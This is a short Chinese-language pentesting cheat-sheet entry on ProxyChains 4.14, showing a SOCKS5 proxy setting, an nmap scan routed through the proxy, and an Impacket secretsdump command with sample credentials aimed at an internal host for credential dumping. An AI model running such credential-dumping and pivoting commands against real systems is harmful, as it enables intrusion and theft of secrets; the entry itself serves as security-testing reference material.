### ProxyChains

| 属性 | 值 |
|------|-----|
| 版本 | 4.14 |
| 平台 | Linux |
| 风险 | 🟠 中 |
| 标签 | `代理` `隧道` `流量转发` |

## ProxyChains 代理链配置

### 配置 SOCKS5 代理 (在 proxychains.conf 中)
```bash
[ProxyList]
socks5 127.0.0.1 1080
```

### 通过代理链运行 Nmap
```bash
proxychains4 nmap -sT -Pn 192.168.1.10
```

### 通过代理链运行 Impacket 工具
```bash
proxychains4 python3 secretsdump.py contoso.com/admin:pass@192.168.1.10
```

- ✓ 强制命令行工具流量走代理隧道
- ✓ 支持 strict/dynamic/random 链模式
- 内网渗透必备流量转发工具
